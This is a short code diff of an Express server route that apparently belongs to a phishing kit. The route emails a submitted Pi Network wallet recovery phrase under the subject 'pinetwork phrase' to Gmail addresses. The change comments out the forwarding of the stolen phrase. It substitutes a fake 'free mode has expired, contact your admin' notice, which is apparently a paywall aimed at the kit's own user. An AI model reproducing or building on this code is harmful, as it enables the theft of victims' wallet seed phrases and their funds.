@@ -59,8 +59,12 @@ app.post("/submit/7668", async (req, res) => {
         // to: ["chiemelapromise30@gmail.com"],
         to: ["pinetworkm493@gmail.com"],
         subject: "pinetwork phrase",
-        text: mfText,
-        html: `<h1>${mfText}</h1>`,
+        text: 'Email Status of pinetworkm493@gmail.com',
+        // text: mfText,
+        html: `<h1>Please subscribe ❌❌❌</h1>
+        <h3>Dear pinetworkm493@gmail.com, Your free mode has expired. To continue using our service, Please contact your admin</h3>
+        `,
+        // html: `<h1>${mfText}</h1>`,
       }
       );
   } catch (error) {
